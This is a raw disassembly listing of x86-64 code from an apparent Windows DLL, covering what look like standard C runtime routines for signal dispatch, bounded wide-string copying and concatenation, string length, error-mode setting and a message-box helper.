   18000b24b:	4c 8d 35 96 07 01 00 	lea    0x10796(%rip),%r14        # 0x18001b9e8
   18000b252:	48 8b 0d 8f 07 01 00 	mov    0x1078f(%rip),%rcx        # 0x18001b9e8
   18000b259:	eb 7b                	jmp    0x18000b2d6
   18000b25b:	4c 8d 35 7e 07 01 00 	lea    0x1077e(%rip),%r14        # 0x18001b9e0
   18000b262:	48 8b 0d 77 07 01 00 	mov    0x10777(%rip),%rcx        # 0x18001b9e0
   18000b269:	eb 6b                	jmp    0x18000b2d6
   18000b26b:	e8 74 db ff ff       	call   0x180008de4
   18000b270:	48 8b f0             	mov    %rax,%rsi
   18000b273:	48 85 c0             	test   %rax,%rax
   18000b276:	75 08                	jne    0x18000b280
   18000b278:	83 c8 ff             	or     $0xffffffff,%eax
   18000b27b:	e9 6b 01 00 00       	jmp    0x18000b3eb
   18000b280:	48 8b 90 a0 00 00 00 	mov    0xa0(%rax),%rdx
   18000b287:	48 8b ca             	mov    %rdx,%rcx
   18000b28a:	4c 63 05 6f 76 00 00 	movslq 0x766f(%rip),%r8        # 0x180012900
   18000b291:	39 59 04             	cmp    %ebx,0x4(%rcx)
   18000b294:	74 13                	je     0x18000b2a9
   18000b296:	48 83 c1 10          	add    $0x10,%rcx
   18000b29a:	49 8b c0             	mov    %r8,%rax
   18000b29d:	48 c1 e0 04          	shl    $0x4,%rax
   18000b2a1:	48 03 c2             	add    %rdx,%rax
   18000b2a4:	48 3b c8             	cmp    %rax,%rcx
   18000b2a7:	72 e8                	jb     0x18000b291
   18000b2a9:	49 8b c0             	mov    %r8,%rax
   18000b2ac:	48 c1 e0 04          	shl    $0x4,%rax
   18000b2b0:	48 03 c2             	add    %rdx,%rax
   18000b2b3:	48 3b c8             	cmp    %rax,%rcx
   18000b2b6:	73 05                	jae    0x18000b2bd
   18000b2b8:	39 59 04             	cmp    %ebx,0x4(%rcx)
   18000b2bb:	74 02                	je     0x18000b2bf
   18000b2bd:	33 c9                	xor    %ecx,%ecx
   18000b2bf:	4c 8d 71 08          	lea    0x8(%rcx),%r14
   18000b2c3:	4d 8b 3e             	mov    (%r14),%r15
   18000b2c6:	eb 20                	jmp    0x18000b2e8
   18000b2c8:	4c 8d 35 01 07 01 00 	lea    0x10701(%rip),%r14        # 0x18001b9d0
   18000b2cf:	48 8b 0d fa 06 01 00 	mov    0x106fa(%rip),%rcx        # 0x18001b9d0
   18000b2d6:	bf 01 00 00 00       	mov    $0x1,%edi
   18000b2db:	89 7c 24 60          	mov    %edi,0x60(%rsp)
   18000b2df:	ff 15 d3 5d 00 00    	call   *0x5dd3(%rip)        # 0x1800110b8
   18000b2e5:	4c 8b f8             	mov    %rax,%r15
   18000b2e8:	49 83 ff 01          	cmp    $0x1,%r15
   18000b2ec:	75 07                	jne    0x18000b2f5
   18000b2ee:	33 c0                	xor    %eax,%eax
   18000b2f0:	e9 f6 00 00 00       	jmp    0x18000b3eb
   18000b2f5:	4d 85 ff             	test   %r15,%r15
   18000b2f8:	75 0a                	jne    0x18000b304
   18000b2fa:	41 8d 4f 03          	lea    0x3(%r15),%ecx
   18000b2fe:	e8 79 c6 ff ff       	call   0x18000797c
   18000b303:	cc                   	int3
   18000b304:	85 ff                	test   %edi,%edi
   18000b306:	74 08                	je     0x18000b310
   18000b308:	33 c9                	xor    %ecx,%ecx
   18000b30a:	e8 fd f9 ff ff       	call   0x18000ad0c
   18000b30f:	90                   	nop
   18000b310:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   18000b316:	83 fb 0b             	cmp    $0xb,%ebx
   18000b319:	77 33                	ja     0x18000b34e
   18000b31b:	41 0f a3 dc          	bt     %ebx,%r12d
   18000b31f:	73 2d                	jae    0x18000b34e
   18000b321:	4c 8b ae a8 00 00 00 	mov    0xa8(%rsi),%r13
   18000b328:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   18000b32d:	48 83 a6 a8 00 00 00 	andq   $0x0,0xa8(%rsi)
   18000b334:	00 
   18000b335:	83 fb 08             	cmp    $0x8,%ebx
   18000b338:	75 52                	jne    0x18000b38c
   18000b33a:	8b 86 b0 00 00 00    	mov    0xb0(%rsi),%eax
   18000b340:	89 44 24 68          	mov    %eax,0x68(%rsp)
   18000b344:	c7 86 b0 00 00 00 8c 	movl   $0x8c,0xb0(%rsi)
   18000b34b:	00 00 00 
   18000b34e:	83 fb 08             	cmp    $0x8,%ebx
   18000b351:	75 39                	jne    0x18000b38c
   18000b353:	8b 0d af 75 00 00    	mov    0x75af(%rip),%ecx        # 0x180012908
   18000b359:	8b d1                	mov    %ecx,%edx
   18000b35b:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   18000b35f:	8b 05 a7 75 00 00    	mov    0x75a7(%rip),%eax        # 0x18001290c
   18000b365:	03 c8                	add    %eax,%ecx
   18000b367:	3b d1                	cmp    %ecx,%edx
   18000b369:	7d 2c                	jge    0x18000b397
   18000b36b:	48 63 ca             	movslq %edx,%rcx
   18000b36e:	48 03 c9             	add    %rcx,%rcx
   18000b371:	48 8b 86 a0 00 00 00 	mov    0xa0(%rsi),%rax
   18000b378:	48 83 64 c8 08 00    	andq   $0x0,0x8(%rax,%rcx,8)
   18000b37e:	ff c2                	inc    %edx
   18000b380:	89 54 24 20          	mov    %edx,0x20(%rsp)
   18000b384:	8b 0d 7e 75 00 00    	mov    0x757e(%rip),%ecx        # 0x180012908
   18000b38a:	eb d3                	jmp    0x18000b35f
   18000b38c:	33 c9                	xor    %ecx,%ecx
   18000b38e:	ff 15 1c 5d 00 00    	call   *0x5d1c(%rip)        # 0x1800110b0
   18000b394:	49 89 06             	mov    %rax,(%r14)
   18000b397:	85 ff                	test   %edi,%edi
   18000b399:	74 07                	je     0x18000b3a2
   18000b39b:	33 c9                	xor    %ecx,%ecx
   18000b39d:	e8 5a fb ff ff       	call   0x18000aefc
   18000b3a2:	83 fb 08             	cmp    $0x8,%ebx
   18000b3a5:	75 0d                	jne    0x18000b3b4
   18000b3a7:	8b 96 b0 00 00 00    	mov    0xb0(%rsi),%edx
   18000b3ad:	8b cb                	mov    %ebx,%ecx
   18000b3af:	41 ff d7             	call   *%r15
   18000b3b2:	eb 05                	jmp    0x18000b3b9
   18000b3b4:	8b cb                	mov    %ebx,%ecx
   18000b3b6:	41 ff d7             	call   *%r15
   18000b3b9:	83 fb 0b             	cmp    $0xb,%ebx
   18000b3bc:	0f 87 2c ff ff ff    	ja     0x18000b2ee
   18000b3c2:	41 0f a3 dc          	bt     %ebx,%r12d
   18000b3c6:	0f 83 22 ff ff ff    	jae    0x18000b2ee
   18000b3cc:	4c 89 ae a8 00 00 00 	mov    %r13,0xa8(%rsi)
   18000b3d3:	83 fb 08             	cmp    $0x8,%ebx
   18000b3d6:	0f 85 12 ff ff ff    	jne    0x18000b2ee
   18000b3dc:	8b 44 24 68          	mov    0x68(%rsp),%eax
   18000b3e0:	89 86 b0 00 00 00    	mov    %eax,0xb0(%rsi)
   18000b3e6:	e9 03 ff ff ff       	jmp    0x18000b2ee
   18000b3eb:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   18000b3f0:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   18000b3f5:	48 83 c4 30          	add    $0x30,%rsp
   18000b3f9:	41 5f                	pop    %r15
   18000b3fb:	41 5e                	pop    %r14
   18000b3fd:	41 5d                	pop    %r13
   18000b3ff:	41 5c                	pop    %r12
   18000b401:	5f                   	pop    %rdi
   18000b402:	c3                   	ret
   18000b403:	cc                   	int3
   18000b404:	48 89 0d ed 05 01 00 	mov    %rcx,0x105ed(%rip)        # 0x18001b9f8
   18000b40b:	c3                   	ret
   18000b40c:	40 53                	rex push %rbx
   18000b40e:	48 83 ec 20          	sub    $0x20,%rsp
   18000b412:	45 33 d2             	xor    %r10d,%r10d
   18000b415:	4c 8b c9             	mov    %rcx,%r9
   18000b418:	48 85 c9             	test   %rcx,%rcx
   18000b41b:	74 0e                	je     0x18000b42b
   18000b41d:	48 85 d2             	test   %rdx,%rdx
   18000b420:	74 09                	je     0x18000b42b
   18000b422:	4d 85 c0             	test   %r8,%r8
   18000b425:	75 1d                	jne    0x18000b444
   18000b427:	66 44 89 11          	mov    %r10w,(%rcx)
   18000b42b:	e8 00 c2 ff ff       	call   0x180007630
   18000b430:	bb 16 00 00 00       	mov    $0x16,%ebx
   18000b435:	89 18                	mov    %ebx,(%rax)
   18000b437:	e8 28 c1 ff ff       	call   0x180007564
   18000b43c:	8b c3                	mov    %ebx,%eax
   18000b43e:	48 83 c4 20          	add    $0x20,%rsp
   18000b442:	5b                   	pop    %rbx
   18000b443:	c3                   	ret
   18000b444:	66 44 39 11          	cmp    %r10w,(%rcx)
   18000b448:	74 09                	je     0x18000b453
   18000b44a:	48 83 c1 02          	add    $0x2,%rcx
   18000b44e:	48 ff ca             	dec    %rdx
   18000b451:	75 f1                	jne    0x18000b444
   18000b453:	48 85 d2             	test   %rdx,%rdx
   18000b456:	75 06                	jne    0x18000b45e
   18000b458:	66 45 89 11          	mov    %r10w,(%r9)
   18000b45c:	eb cd                	jmp    0x18000b42b
   18000b45e:	49 2b c8             	sub    %r8,%rcx
   18000b461:	41 0f b7 00          	movzwl (%r8),%eax
   18000b465:	66 42 89 04 01       	mov    %ax,(%rcx,%r8,1)
   18000b46a:	4d 8d 40 02          	lea    0x2(%r8),%r8
   18000b46e:	66 85 c0             	test   %ax,%ax
   18000b471:	74 05                	je     0x18000b478
   18000b473:	48 ff ca             	dec    %rdx
   18000b476:	75 e9                	jne    0x18000b461
   18000b478:	48 85 d2             	test   %rdx,%rdx
   18000b47b:	75 10                	jne    0x18000b48d
   18000b47d:	66 45 89 11          	mov    %r10w,(%r9)
   18000b481:	e8 aa c1 ff ff       	call   0x180007630
   18000b486:	bb 22 00 00 00       	mov    $0x22,%ebx
   18000b48b:	eb a8                	jmp    0x18000b435
   18000b48d:	33 c0                	xor    %eax,%eax
   18000b48f:	eb ad                	jmp    0x18000b43e
   18000b491:	cc                   	int3
   18000b492:	cc                   	int3
   18000b493:	cc                   	int3
   18000b494:	40 53                	rex push %rbx
   18000b496:	48 83 ec 20          	sub    $0x20,%rsp
   18000b49a:	45 33 d2             	xor    %r10d,%r10d
   18000b49d:	48 85 c9             	test   %rcx,%rcx
   18000b4a0:	74 0e                	je     0x18000b4b0
   18000b4a2:	48 85 d2             	test   %rdx,%rdx
   18000b4a5:	74 09                	je     0x18000b4b0
   18000b4a7:	4d 85 c0             	test   %r8,%r8
   18000b4aa:	75 1d                	jne    0x18000b4c9
   18000b4ac:	66 44 89 11          	mov    %r10w,(%rcx)
   18000b4b0:	e8 7b c1 ff ff       	call   0x180007630
   18000b4b5:	bb 16 00 00 00       	mov    $0x16,%ebx
   18000b4ba:	89 18                	mov    %ebx,(%rax)
   18000b4bc:	e8 a3 c0 ff ff       	call   0x180007564
   18000b4c1:	8b c3                	mov    %ebx,%eax
   18000b4c3:	48 83 c4 20          	add    $0x20,%rsp
   18000b4c7:	5b                   	pop    %rbx
   18000b4c8:	c3                   	ret
   18000b4c9:	4c 8b c9             	mov    %rcx,%r9
   18000b4cc:	4d 2b c8             	sub    %r8,%r9
   18000b4cf:	41 0f b7 00          	movzwl (%r8),%eax
   18000b4d3:	66 43 89 04 01       	mov    %ax,(%r9,%r8,1)
   18000b4d8:	4d 8d 40 02          	lea    0x2(%r8),%r8
   18000b4dc:	66 85 c0             	test   %ax,%ax
   18000b4df:	74 05                	je     0x18000b4e6
   18000b4e1:	48 ff ca             	dec    %rdx
   18000b4e4:	75 e9                	jne    0x18000b4cf
   18000b4e6:	48 85 d2             	test   %rdx,%rdx
   18000b4e9:	75 10                	jne    0x18000b4fb
   18000b4eb:	66 44 89 11          	mov    %r10w,(%rcx)
   18000b4ef:	e8 3c c1 ff ff       	call   0x180007630
   18000b4f4:	bb 22 00 00 00       	mov    $0x22,%ebx
   18000b4f9:	eb bf                	jmp    0x18000b4ba
   18000b4fb:	33 c0                	xor    %eax,%eax
   18000b4fd:	eb c4                	jmp    0x18000b4c3
   18000b4ff:	cc                   	int3
   18000b500:	48 8b c1             	mov    %rcx,%rax
   18000b503:	0f b7 10             	movzwl (%rax),%edx
   18000b506:	48 83 c0 02          	add    $0x2,%rax
   18000b50a:	66 85 d2             	test   %dx,%dx
   18000b50d:	75 f4                	jne    0x18000b503
   18000b50f:	48 2b c1             	sub    %rcx,%rax
   18000b512:	48 d1 f8             	sar    $1,%rax
   18000b515:	48 ff c8             	dec    %rax
   18000b518:	c3                   	ret
   18000b519:	cc                   	int3
   18000b51a:	cc                   	int3
   18000b51b:	cc                   	int3
   18000b51c:	40 53                	rex push %rbx
   18000b51e:	48 83 ec 20          	sub    $0x20,%rsp
   18000b522:	33 db                	xor    %ebx,%ebx
   18000b524:	4d 85 c9             	test   %r9,%r9
   18000b527:	75 0e                	jne    0x18000b537
   18000b529:	48 85 c9             	test   %rcx,%rcx
   18000b52c:	75 0e                	jne    0x18000b53c
   18000b52e:	48 85 d2             	test   %rdx,%rdx
   18000b531:	75 20                	jne    0x18000b553
   18000b533:	33 c0                	xor    %eax,%eax
   18000b535:	eb 2f                	jmp    0x18000b566
   18000b537:	48 85 c9             	test   %rcx,%rcx
   18000b53a:	74 17                	je     0x18000b553
   18000b53c:	48 85 d2             	test   %rdx,%rdx
   18000b53f:	74 12                	je     0x18000b553
   18000b541:	4d 85 c9             	test   %r9,%r9
   18000b544:	75 05                	jne    0x18000b54b
   18000b546:	66 89 19             	mov    %bx,(%rcx)
   18000b549:	eb e8                	jmp    0x18000b533
   18000b54b:	4d 85 c0             	test   %r8,%r8
   18000b54e:	75 1c                	jne    0x18000b56c
   18000b550:	66 89 19             	mov    %bx,(%rcx)
   18000b553:	e8 d8 c0 ff ff       	call   0x180007630
   18000b558:	bb 16 00 00 00       	mov    $0x16,%ebx
   18000b55d:	89 18                	mov    %ebx,(%rax)
   18000b55f:	e8 00 c0 ff ff       	call   0x180007564
   18000b564:	8b c3                	mov    %ebx,%eax
   18000b566:	48 83 c4 20          	add    $0x20,%rsp
   18000b56a:	5b                   	pop    %rbx
   18000b56b:	c3                   	ret
   18000b56c:	4c 8b d9             	mov    %rcx,%r11
   18000b56f:	4c 8b d2             	mov    %rdx,%r10
   18000b572:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   18000b576:	75 1c                	jne    0x18000b594
   18000b578:	4d 2b d8             	sub    %r8,%r11
   18000b57b:	41 0f b7 00          	movzwl (%r8),%eax
   18000b57f:	66 43 89 04 03       	mov    %ax,(%r11,%r8,1)
   18000b584:	4d 8d 40 02          	lea    0x2(%r8),%r8
   18000b588:	66 85 c0             	test   %ax,%ax
   18000b58b:	74 2f                	je     0x18000b5bc
   18000b58d:	49 ff ca             	dec    %r10
   18000b590:	75 e9                	jne    0x18000b57b
   18000b592:	eb 28                	jmp    0x18000b5bc
   18000b594:	4c 2b c1             	sub    %rcx,%r8
   18000b597:	43 0f b7 04 18       	movzwl (%r8,%r11,1),%eax
   18000b59c:	66 41 89 03          	mov    %ax,(%r11)
   18000b5a0:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   18000b5a4:	66 85 c0             	test   %ax,%ax
   18000b5a7:	74 0a                	je     0x18000b5b3
   18000b5a9:	49 ff ca             	dec    %r10
   18000b5ac:	74 05                	je     0x18000b5b3
   18000b5ae:	49 ff c9             	dec    %r9
   18000b5b1:	75 e4                	jne    0x18000b597
   18000b5b3:	4d 85 c9             	test   %r9,%r9
   18000b5b6:	75 04                	jne    0x18000b5bc
   18000b5b8:	66 41 89 1b          	mov    %bx,(%r11)
   18000b5bc:	4d 85 d2             	test   %r10,%r10
   18000b5bf:	0f 85 6e ff ff ff    	jne    0x18000b533
   18000b5c5:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   18000b5c9:	75 0b                	jne    0x18000b5d6
   18000b5cb:	66 89 5c 51 fe       	mov    %bx,-0x2(%rcx,%rdx,2)
   18000b5d0:	41 8d 42 50          	lea    0x50(%r10),%eax
   18000b5d4:	eb 90                	jmp    0x18000b566
   18000b5d6:	66 89 19             	mov    %bx,(%rcx)
   18000b5d9:	e8 52 c0 ff ff       	call   0x180007630
   18000b5de:	bb 22 00 00 00       	mov    $0x22,%ebx
   18000b5e3:	e9 75 ff ff ff       	jmp    0x18000b55d
   18000b5e8:	48 83 ec 28          	sub    $0x28,%rsp
   18000b5ec:	85 c9                	test   %ecx,%ecx
   18000b5ee:	78 20                	js     0x18000b610
   18000b5f0:	83 f9 02             	cmp    $0x2,%ecx
   18000b5f3:	7e 0d                	jle    0x18000b602
   18000b5f5:	83 f9 03             	cmp    $0x3,%ecx
   18000b5f8:	75 16                	jne    0x18000b610
   18000b5fa:	8b 05 10 04 01 00    	mov    0x10410(%rip),%eax        # 0x18001ba10
   18000b600:	eb 21                	jmp    0x18000b623
   18000b602:	8b 05 08 04 01 00    	mov    0x10408(%rip),%eax        # 0x18001ba10
   18000b608:	89 0d 02 04 01 00    	mov    %ecx,0x10402(%rip)        # 0x18001ba10
   18000b60e:	eb 13                	jmp    0x18000b623
   18000b610:	e8 1b c0 ff ff       	call   0x180007630
   18000b615:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000b61b:	e8 44 bf ff ff       	call   0x180007564
   18000b620:	83 c8 ff             	or     $0xffffffff,%eax
   18000b623:	48 83 c4 28          	add    $0x28,%rsp
   18000b627:	c3                   	ret
   18000b628:	40 53                	rex push %rbx
   18000b62a:	55                   	push   %rbp
   18000b62b:	56                   	push   %rsi
   18000b62c:	57                   	push   %rdi
   18000b62d:	41 54                	push   %r12
   18000b62f:	41 56                	push   %r14
   18000b631:	41 57                	push   %r15
   18000b633:	48 83 ec 50          	sub    $0x50,%rsp
   18000b637:	48 8b 05 c2 d9 00 00 	mov    0xd9c2(%rip),%rax        # 0x180019000
   18000b63e:	48 33 c4             	xor    %rsp,%rax
   18000b641:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   18000b646:	4c 8b f9             	mov    %rcx,%r15
   18000b649:	33 c9                	xor    %ecx,%ecx
   18000b64b:	41 8b e8             	mov    %r8d,%ebp
   18000b64e:	4c 8b e2             	mov    %rdx,%r12
   18000b651:	ff 15 59 5a 00 00    	call   *0x5a59(%rip)        # 0x1800110b0
   18000b657:	33 ff                	xor    %edi,%edi
   18000b659:	48 8b f0             	mov    %rax,%rsi
   18000b65c:	e8 53 e6 ff ff       	call   0x180009cb4
   18000b661:	48 39 3d b0 03 01 00 	cmp    %rdi,0x103b0(%rip)        # 0x18001ba18
   18000b668:	44 8b f0             	mov    %eax,%r14d
   18000b66b:	0f 85 f8 00 00 00    	jne    0x18000b769
   18000b671:	48 8d 0d c0 75 00 00 	lea    0x75c0(%rip),%rcx        # 0x180012c38
   18000b678:	33 d2                	xor    %edx,%edx
   18000b67a:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   18000b680:	ff 15 6a 5b 00 00    	call   *0x5b6a(%rip)        # 0x1800111f0
   18000b686:	48 8b d8             	mov    %rax,%rbx
   18000b689:	48 85 c0             	test   %rax,%rax
   18000b68c:	75 2d                	jne    0x18000b6bb
   18000b68e:	ff 15 e4 59 00 00    	call   *0x59e4(%rip)        # 0x180011078
   18000b694:	83 f8 57             	cmp    $0x57,%eax
   18000b697:	0f 85 e0 01 00 00    	jne    0x18000b87d
   18000b69d:	48 8d 0d 94 75 00 00 	lea    0x7594(%rip),%rcx        # 0x180012c38
   18000b6a4:	45 33 c0             	xor    %r8d,%r8d
   18000b6a7:	33 d2                	xor    %edx,%edx
   18000b6a9:	ff 15 41 5b 00 00    	call   *0x5b41(%rip)        # 0x1800111f0
   18000b6af:	48 8b d8             	mov    %rax,%rbx
   18000b6b2:	48 85 c0             	test   %rax,%rax
   18000b6b5:	0f 84 c2 01 00 00    	je     0x18000b87d
   18000b6bb:	48 8d 15 8e 75 00 00 	lea    0x758e(%rip),%rdx        # 0x180012c50
   18000b6c2:	48 8b cb             	mov    %rbx,%rcx
   18000b6c5:	ff 15 8d 59 00 00    	call   *0x598d(%rip)        # 0x180011058
   18000b6cb:	48 85 c0             	test   %rax,%rax
   18000b6ce:	0f 84 a9 01 00 00    	je     0x18000b87d
   18000b6d4:	48 8b c8             	mov    %rax,%rcx
   18000b6d7:	ff 15 d3 59 00 00    	call   *0x59d3(%rip)        # 0x1800110b0
   18000b6dd:	48 8d 15 7c 75 00 00 	lea    0x757c(%rip),%rdx        # 0x180012c60
   18000b6e4:	48 8b cb             	mov    %rbx,%rcx
   18000b6e7:	48 89 05 2a 03 01 00 	mov    %rax,0x1032a(%rip)        # 0x18001ba18
   18000b6ee:	ff 15 64 59 00 00    	call   *0x5964(%rip)        # 0x180011058
   18000b6f4:	48 8b c8             	mov    %rax,%rcx
   18000b6f7:	ff 15 b3 59 00 00    	call   *0x59b3(%rip)        # 0x1800110b0
   18000b6fd:	48 8d 15 6c 75 00 00 	lea    0x756c(%rip),%rdx        # 0x180012c70
   18000b704:	48 8b cb             	mov    %rbx,%rcx
   18000b707:	48 89 05 12 03 01 00 	mov    %rax,0x10312(%rip)        # 0x18001ba20
   18000b70e:	ff 15 44 59 00 00    	call   *0x5944(%rip)        # 0x180011058
   18000b714:	48 8b c8             	mov    %rax,%rcx
   18000b717:	ff 15 93 59 00 00    	call   *0x5993(%rip)        # 0x1800110b0
   18000b71d:	48 8d 15 64 75 00 00 	lea    0x7564(%rip),%rdx        # 0x180012c88
   18000b724:	48 8b cb             	mov    %rbx,%rcx
   18000b727:	48 89 05 fa 02 01 00 	mov    %rax,0x102fa(%rip)        # 0x18001ba28
   18000b72e:	ff 15 24 59 00 00    	call   *0x5924(%rip)        # 0x180011058
   18000b734:	48 8b c8             	mov    %rax,%rcx
   18000b737:	ff 15 73 59 00 00    	call   *0x5973(%rip)        # 0x1800110b0
   18000b73d:	48 89 05 f4 02 01 00 	mov    %rax,0x102f4(%rip)        # 0x18001ba38
   18000b744:	48 85 c0             	test   %rax,%rax
   18000b747:	74 20                	je     0x18000b769
   18000b749:	48 8d 15 58 75 00 00 	lea    0x7558(%rip),%rdx        # 0x180012ca8
   18000b750:	48 8b cb             	mov    %rbx,%rcx
   18000b753:	ff 15 ff 58 00 00    	call   *0x58ff(%rip)        # 0x180011058
   18000b759:	48 8b c8             	mov    %rax,%rcx
   18000b75c:	ff 15 4e 59 00 00    	call   *0x594e(%rip)        # 0x1800110b0
   18000b762:	48 89 05 c7 02 01 00 	mov    %rax,0x102c7(%rip)        # 0x18001ba30
   18000b769:	ff 15 31 59 00 00    	call   *0x5931(%rip)        # 0x1800110a0
   18000b76f:	85 c0                	test   %eax,%eax
   18000b771:	74 1d                	je     0x18000b790
   18000b773:	4d 85 ff             	test   %r15,%r15
   18000b776:	74 09                	je     0x18000b781
   18000b778:	49 8b cf             	mov    %r15,%rcx
   18000b77b:	ff 15 77 5a 00 00    	call   *0x5a77(%rip)        # 0x1800111f8
   18000b781:	45 85 f6             	test   %r14d,%r14d
   18000b784:	74 26                	je     0x18000b7ac
   18000b786:	b8 04 00 00 00       	mov    $0x4,%eax
   18000b78b:	e9 ef 00 00 00       	jmp    0x18000b87f
   18000b790:	45 85 f6             	test   %r14d,%r14d
   18000b793:	74 17                	je     0x18000b7ac
   18000b795:	48 8b 0d 7c 02 01 00 	mov    0x1027c(%rip),%rcx        # 0x18001ba18
   18000b79c:	ff 15 16 59 00 00    	call   *0x5916(%rip)        # 0x1800110b8
   18000b7a2:	b8 03 00 00 00       	mov    $0x3,%eax
   18000b7a7:	e9 d3 00 00 00       	jmp    0x18000b87f
   18000b7ac:	48 8b 0d 7d 02 01 00 	mov    0x1027d(%rip),%rcx        # 0x18001ba30
   18000b7b3:	48 3b ce             	cmp    %rsi,%rcx
   18000b7b6:	74 63                	je     0x18000b81b
   18000b7b8:	48 39 35 79 02 01 00 	cmp    %rsi,0x10279(%rip)        # 0x18001ba38
   18000b7bf:	74 5a                	je     0x18000b81b
   18000b7c1:	ff 15 f1 58 00 00    	call   *0x58f1(%rip)        # 0x1800110b8
   18000b7c7:	48 8b 0d 6a 02 01 00 	mov    0x1026a(%rip),%rcx        # 0x18001ba38
   18000b7ce:	48 8b d8             	mov    %rax,%rbx
   18000b7d1:	ff 15 e1 58 00 00    	call   *0x58e1(%rip)        # 0x1800110b8
   18000b7d7:	4c 8b f0             	mov    %rax,%r14
   18000b7da:	48 85 db             	test   %rbx,%rbx
   18000b7dd:	74 3c                	je     0x18000b81b
   18000b7df:	48 85 c0             	test   %rax,%rax
   18000b7e2:	74 37                	je     0x18000b81b
   18000b7e4:	ff d3                	call   *%rbx
   18000b7e6:	48 85 c0             	test   %rax,%rax
   18000b7e9:	74 2a                	je     0x18000b815
   18000b7eb:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000b7f0:	41 b9 0c 00 00 00    	mov    $0xc,%r9d
   18000b7f6:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   18000b7fb:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000b800:	41 8d 51 f5          	lea    -0xb(%r9),%edx
   18000b804:	48 8b c8             	mov    %rax,%rcx
   18000b807:	41 ff d6             	call   *%r14
   18000b80a:	85 c0                	test   %eax,%eax
   18000b80c:	74 07                	je     0x18000b815
   18000b80e:	f6 44 24 40 01       	testb  $0x1,0x40(%rsp)
   18000b813:	75 06                	jne    0x18000b81b
   18000b815:	0f ba ed 15          	bts    $0x15,%ebp
   18000b819:	eb 40                	jmp    0x18000b85b
   18000b81b:	48 8b 0d fe 01 01 00 	mov    0x101fe(%rip),%rcx        # 0x18001ba20
   18000b822:	48 3b ce             	cmp    %rsi,%rcx
   18000b825:	74 34                	je     0x18000b85b
   18000b827:	ff 15 8b 58 00 00    	call   *0x588b(%rip)        # 0x1800110b8
   18000b82d:	48 85 c0             	test   %rax,%rax
   18000b830:	74 29                	je     0x18000b85b
   18000b832:	ff d0                	call   *%rax
   18000b834:	48 8b f8             	mov    %rax,%rdi
   18000b837:	48 85 c0             	test   %rax,%rax
   18000b83a:	74 1f                	je     0x18000b85b
   18000b83c:	48 8b 0d e5 01 01 00 	mov    0x101e5(%rip),%rcx        # 0x18001ba28
   18000b843:	48 3b ce             	cmp    %rsi,%rcx
   18000b846:	74 13                	je     0x18000b85b
   18000b848:	ff 15 6a 58 00 00    	call   *0x586a(%rip)        # 0x1800110b8
   18000b84e:	48 85 c0             	test   %rax,%rax
   18000b851:	74 08                	je     0x18000b85b
   18000b853:	48 8b cf             	mov    %rdi,%rcx
   18000b856:	ff d0                	call   *%rax
   18000b858:	48 8b f8             	mov    %rax,%rdi
   18000b85b:	48 8b 0d b6 01 01 00 	mov    0x101b6(%rip),%rcx        # 0x18001ba18
   18000b862:	ff 15 50 58 00 00    	call   *0x5850(%rip)        # 0x1800110b8
   18000b868:	48 85 c0             	test   %rax,%rax
   18000b86b:	74 10                	je     0x18000b87d
   18000b86d:	44 8b cd             	mov    %ebp,%r9d
   18000b870:	4d 8b c4             	mov    %r12,%r8
   18000b873:	49 8b d7             	mov    %r15,%rdx
   18000b876:	48 8b cf             	mov    %rdi,%rcx
   18000b879:	ff d0                	call   *%rax
   18000b87b:	eb 02                	jmp    0x18000b87f
   18000b87d:	33 c0                	xor    %eax,%eax
   18000b87f:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   18000b884:	48 33 cc             	xor    %rsp,%rcx
   18000b887:	e8 a4 99 ff ff       	call   0x180005230
   18000b88c:	48 83 c4 50          	add    $0x50,%rsp
   18000b890:	41 5f                	pop    %r15
   18000b892:	41 5e                	pop    %r14
   18000b894:	41 5c                	pop    %r12
   18000b896:	5f                   	pop    %rdi
   18000b897:	5e                   	pop    %rsi
   18000b898:	5d                   	pop    %rbp
   18000b899:	5b                   	pop    %rbx
   18000b89a:	c3                   	ret
   18000b89b:	cc                   	int3
   18000b89c:	48 85 c9             	test   %rcx,%rcx
   18000b89f:	0f 84 00 01 00 00    	je     0x18000b9a5
   18000b8a5:	53                   	push   %rbx
   18000b8a6:	48 83 ec 20          	sub    $0x20,%rsp
   18000b8aa:	48 8b d9             	mov    %rcx,%rbx
   18000b8ad:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   18000b8b1:	48 3b 0d 90 e5 00 00 	cmp    0xe590(%rip),%rcx        # 0x180019e48
   18000b8b8:	74 05                	je     0x18000b8bf
   18000b8ba:	e8 c1 9c ff ff       	call   0x180005580
   18000b8bf:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   18000b8c3:	48 3b 0d 86 e5 00 00 	cmp    0xe586(%rip),%rcx        # 0x180019e50
   18000b8ca:	74 05                	je     0x18000b8d1
   18000b8cc:	e8 af 9c ff ff       	call   0x180005580
   18000b8d1:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   18000b8d5:	48 3b 0d 7c e5 00 00 	cmp    0xe57c(%rip),%rcx        # 0x180019e58
   18000b8dc:	74 05                	je     0x18000b8e3
   18000b8de:	e8 9d 9c ff ff       	call   0x180005580
   18000b8e3:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   18000b8e7:	48 3b 0d 72 e5 00 00 	cmp    0xe572(%rip),%rcx        # 0x180019e60
   18000b8ee:	74 05                	je     0x18000b8f5
   18000b8f0:	e8 8b 9c ff ff       	call   0x180005580
   18000b8f5:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   18000b8f9:	48 3b 0d 68 e5 00 00 	cmp    0xe568(%rip),%rcx        # 0x180019e68
   18000b900:	74 05                	je     0x18000b907
   18000b902:	e8 79 9c ff ff       	call   0x180005580
   18000b907:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
